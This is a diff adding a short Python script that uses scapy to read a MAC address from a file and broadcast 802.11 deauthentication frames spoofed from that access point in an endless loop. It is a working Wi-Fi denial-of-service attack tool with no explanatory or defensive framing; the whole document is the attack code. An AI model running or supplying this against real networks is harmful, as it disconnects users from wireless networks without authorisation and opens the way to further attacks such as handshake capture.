@@ -1,0 +1,12 @@
+from scapy.all import *
+import time
+
+file = open("info.txt" , "r")
+mac = file.readlines()
+file.close()
+
+
+frame = Radiotap()/Dot11(type = 0, subtype = 12, addr1 = "ff:ff:ff:ff:ff:ff", addr2 = str(mac[0]), addr3 = str(mac[0]))/Dot11Deauth()
+while True:
+	sendp(frame)
+	time.sleep(0.5)
